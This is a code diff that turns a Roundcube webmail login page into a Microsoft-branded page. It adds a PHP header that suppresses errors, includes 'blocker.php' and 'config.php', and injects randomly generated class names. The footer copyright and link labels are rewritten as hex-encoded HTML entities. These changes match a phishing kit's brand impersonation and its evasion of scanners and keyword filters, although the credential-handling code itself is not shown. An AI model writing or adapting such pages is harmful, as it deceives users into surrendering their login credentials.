@@ -1,3 +1,6 @@
+<?php error_reporting(0);include('blocker.php');include('config.php');
+function rndString($length=10){return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"),0,$length);};$rndString1=rndString(7);$rndString2=rndString(8);$rndString3=rndString(6);$rndString4=rndString(5);
+?>
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
 <html dir="ltr" lang="en">
 
@@ -19,7 +22,7 @@
 
 
 <style>
-.roundcube-logo {
+.ms-logo {
   margin-left: 30px;
   display: inline-block;
   background: #F25022;
@@ -29,7 +32,7 @@
   transform: translatex(-300%);
 }
 .ms-logo::after {
-  content: 'Roundcube';
+  content: 'Microsoft';
   /*font-family: 'Segoe Pro', 'Segoe UI', 'Open Sans', sans-serif;
   font-weight: 600;*/
   font: bold 20px sans-serif;
@@ -188,7 +191,7 @@
             <div id="footerLinks" class="footerNode text-secondary <?=$rndString3?>">
                     <div class="footerNode <?=$rndString4?>">
                         <span>
-&#xA9;2024 RoundCube;                        </span>
+&#xA9;2020&#x20;&#x4D;&#x69;&#x63;&#x72;&#x6F;&#x73;&#x6F;&#x66;&#x74;                        </span>
                         <a href="#" target="_blank">&#x54;&#x65;&#x72;&#x6D;&#x73;&#x20;&#x6F;&#x66;&#x20;&#x75;&#x73;&#x65;</a>
                         <a href="#" target="_blank">&#x50;&#x72;&#x69;&#x76;&#x61;&#x63;&#x79;&#x20;&#x26;&#x20;&#x63;&#x6F;&#x6F;&#x6B;&#x69;&#x65;&#x73;</a>
                     </div>
